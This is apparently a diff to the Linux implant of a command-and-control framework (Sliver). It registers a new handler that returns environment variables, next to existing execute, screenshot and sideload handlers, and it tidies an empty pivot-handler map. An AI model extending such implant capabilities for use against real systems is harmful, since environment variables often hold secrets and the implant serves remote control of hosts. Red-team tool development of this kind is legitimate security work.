@@ -37,6 +37,7 @@ var (
 		sliverpb.MsgTaskReq:      taskHandler,
 		sliverpb.MsgIfconfigReq:  ifconfigHandler,
 		sliverpb.MsgExecuteReq:   executeHandler,
+		sliverpb.MsgEnvReq:       getEnvHandler,
 
 		sliverpb.MsgScreenshotReq: screenshotHandler,
 
@@ -44,8 +45,7 @@ var (
 		sliverpb.MsgSideloadReq: sideloadHandler,
 	}
 
-	linuxPivotHandlers = map[uint32]PivotHandler{
-	}
+	linuxPivotHandlers = map[uint32]PivotHandler{}
 )
 
 // GetSystemHandlers - Returns a map of the linux system handlers
